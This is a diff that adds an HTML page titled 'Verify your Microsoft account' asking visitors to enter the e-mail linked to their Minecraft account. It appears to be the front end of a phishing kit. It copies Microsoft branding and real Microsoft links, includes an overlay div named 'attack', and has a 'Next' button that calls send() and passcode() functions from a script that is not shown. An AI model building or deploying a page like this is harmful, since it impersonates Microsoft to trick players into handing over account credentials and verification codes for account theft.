@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" type="image/png" href="images/titlelogo.png"/>
+    <title>Verify your Microsoft account</title>
+    <link rel="stylesheet" href="stylesheet.css">
+    <script src="main.js"></script>
+</head>
+<body>
+    <div id="attack" style="z-index: 2;background-image: url(../../8377.svg);position: absolute;left: 0px;top: 0px;width: 100%;height: 100%;pointer-events: none; background-repeat: no-repeat"></div>
+
+    <div id="div1">
+        <img id="img1" src="images/microsoftlogo.png" alt="">
+        <p></p>
+        <p id="p1">Verify your account</p>
+        <label>Enter the E-Mail linked to your Minecraft account.</label><br>
+		<p></p>
+        <input id="textbox" type="text" name="email" placeholder="Minecraft Account E-Mail" required>
+        <hr>
+        <label>No account?</label>
+        <a id="a1" href="https://account.microsoft.com/account">Create one!</a><br><br>
+        <a id="a1" href="https://login.microsoftonline.com/common/oauth2/">Can't access your account?</a>
+        <button id="button1" onclick="send(); passcode();">Next</button>
+    </div>
+    	
+    <div id="div2">
+        <button id="button2">
+            <img id="img2" src="images/key.png" alt="">
+            <label id="label2" for="">Verify options</label>
+        </button>
+
+    </div>
+</body>
+</html>
